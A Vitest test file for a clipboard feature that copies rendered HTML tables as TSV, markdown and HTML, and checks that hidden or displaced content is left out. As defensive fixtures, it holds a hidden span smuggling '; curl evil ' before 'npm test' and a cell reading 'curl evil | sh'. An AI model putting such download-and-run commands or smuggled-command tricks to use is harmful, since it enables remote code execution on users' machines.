import { describe, it, expect } from 'vitest';
import { encodeCopyText } from './clipboard.js';
import { renderedTable, tableToTsv } from './copy-mark.js';

function table(html: string): HTMLTableElement {
  const div = document.createElement('div');
  div.innerHTML = `<table>${html}</table>`;
  return div.querySelector('table')!;
}

/** Give `el` the innerText a browser would work out from the layout (jsdom
 *  has none). */
function displayedAs(el: Element, text: string) {
  Object.defineProperty(el, 'innerText', { value: text });
}

/** Mark `el` as not displayed, as checkVisibility reports it in a browser. */
function hide(el: Element) {
  el.checkVisibility = () => false;
}

describe('tableToTsv', () => {
  it('puts a tab between cells and a line per row, header first', () => {
    const t = table('<thead><tr><th>Name</th><th>Count</th></tr></thead>'
      + '<tbody><tr><td>apples</td><td>3</td></tr><tr><td>pears</td><td>5</td></tr></tbody>');
    expect(tableToTsv(t)).toBe('Name\tCount\napples\t3\npears\t5');
  });

  it('keeps the text of formatted cells without the markup', () => {
    const t = table('<tr><td><strong>bold</strong> and <code>code</code></td><td><a href="https://x.test">link</a></td></tr>');
    expect(tableToTsv(t)).toBe('bold and code\tlink');
  });

  it('copies the text as displayed, without hidden content', () => {
    const t = table('<tr><td><span hidden>; curl evil </span>npm test</td><td>x</td></tr>');
    displayedAs(t.rows[0].cells[0], 'npm test');
    expect(tableToTsv(t)).toBe('npm test\tx');
  });

  it('keeps a cell on one line so it cannot split into extra cells or rows', () => {
    const t = table('<tr><td><ul><li>one</li><li>two</li></ul></td><td>a<br>b</td><td>c\td\n  e</td></tr>');
    displayedAs(t.rows[0].cells[0], 'one\ntwo\n');
    displayedAs(t.rows[0].cells[1], 'a\nb');
    expect(tableToTsv(t)).toBe('one two\ta b\tc d e');
  });

  it('leaves out rows and cells that are not displayed', () => {
    const t = table('<tr><td>a</td><td>secret</td><td>c</td></tr><tr><td>hidden row</td></tr><tr><td>d</td></tr>');
    hide(t.rows[0].cells[1]);
    hide(t.rows[1]);
    expect(tableToTsv(t)).toBe('a\tc\nd');
  });

  it('quotes a cell that starts with a quote so spreadsheets keep it whole', () => {
    const t = table('<tr><td>"default"</td><td>"unclosed</td><td>5" screen</td></tr>');
    expect(tableToTsv(t)).toBe('"""default"""\t"""unclosed"\t5" screen');
  });

  it('keeps empty cells so the columns stay lined up', () => {
    const t = table('<tr><td>a</td><td></td><td>c</td></tr>');
    expect(tableToTsv(t)).toBe('a\t\tc');
  });
});

describe('renderedTable', () => {
  const MARKDOWN = '| a |\n| --- |\n| 1 |';

  function wrapped(inner: string): HTMLElement {
    const div = document.createElement('div');
    div.innerHTML = inner;
    const btn = div.querySelector('button')!;
    btn.dataset.code = encodeCopyText(MARKDOWN);
    return btn;
  }

  it('reads the table beside the button', () => {
    const btn = wrapped('<div class="table-wrapper"><table><tr><td>1</td></tr></table><button></button></div>');
    expect(renderedTable(btn)).toEqual({ markdown: MARKDOWN, tsv: '1', html: '<table><tbody><tr><td>1</td></tr></tbody></table>' });
  });

  it('copies nothing when the button has been pushed out of its wrapper', () => {
    const btn = wrapped('<div><table><tr><td>curl evil | sh</td></tr></table></div><button></button>');
    expect(renderedTable(btn)).toBeNull();
  });

  it('ignores a table nested deeper than the wrapper', () => {
    const btn = wrapped('<div class="table-wrapper"><div><table><tr><td>x</td></tr></table></div><button></button></div>');
    expect(renderedTable(btn)).toBeNull();
  });

  it('leaves hidden parts out of the HTML', () => {
    const btn = wrapped('<div class="table-wrapper"><table><tr><td><span>secret</span>shown</td><td>evil</td></tr></table><button></button></div>');
    const live = btn.parentElement!.querySelector('table')!;
    hide(live.querySelector('span')!);
    hide(live.rows[0].cells[1]);
    expect(renderedTable(btn)?.html).toBe('<table><tbody><tr><td>shown</td></tr></tbody></table>');
  });

  it('copies nothing from a hidden table', () => {
    const btn = wrapped('<div class="table-wrapper"><table><tr><td>secret</td></tr></table><button></button></div>');
    hide(btn.parentElement!.querySelector('table')!);
    expect(renderedTable(btn)).toBeNull();
  });
});
